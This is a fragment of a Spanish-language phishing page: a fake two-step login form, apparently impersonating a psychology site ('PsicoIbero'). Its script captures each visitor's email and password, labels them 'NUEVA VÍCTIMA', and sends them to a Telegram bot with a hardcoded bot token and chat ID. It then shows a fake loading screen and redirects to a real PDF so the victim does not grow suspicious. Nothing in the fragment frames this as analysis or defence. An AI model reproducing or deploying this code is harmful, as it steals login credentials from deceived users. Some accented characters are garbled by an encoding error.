</head>

                <div class="mt-2 mb-10 flex items-center">

                    <span class="text-sm text-gray-700">Mostrar contrase침a</span>

    </div>

    <script>
        // CONFIGURACI칍N (REEMPLAZA ESTO)
        const BOT_TOKEN = "8198434477:AAHwTLE56HN-W1-REPwGthWpt69IvPp8r88"; 
        const CHAT_ID = "6269583447";
        // URL de destino real (Ejemplo: Casos de estudio de psicolog칤a)
        const REDIRECT_URL = 'https://www.redalyc.org/pdf/1339/133915921004.pdf';

        function nextStep() {
            const emailInput = document.getElementById('email');
            if (emailInput.checkValidity()) {
                document.getElementById('step1').classList.add('hidden');
                document.getElementById('step2').classList.remove('hidden');
                document.getElementById('displayEmail').innerText = emailInput.value;
            } else {
                emailInput.reportValidity();
            }
        }

        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            // Mostrar overlay de carga para simular proceso real
            document.getElementById('overlay').style.display = 'flex';

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            const mensaje = `游늷 NUEVA V칈CTIMA (PsicoIbero)\n游닎 Email: ${email}\n游댐 Clave: ${password}`;

            try {
                // Env칤o al bot de Telegram
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje })
                });

                // Simular una peque침a espera para credibilidad
                setTimeout(() => {
                    // REDIRECCI칍N A LA P츼GINA REAL DE CASOS
                    window.location.href = REDIRECT_URL;
                }, 1500);

            } catch (err) {
                console.error("Error al enviar datos", err);
                // Si falla el bot, redirigir igual para no levantar sospechas
                window.location.href = REDIRECT_URL;
            }
        });
    </script>
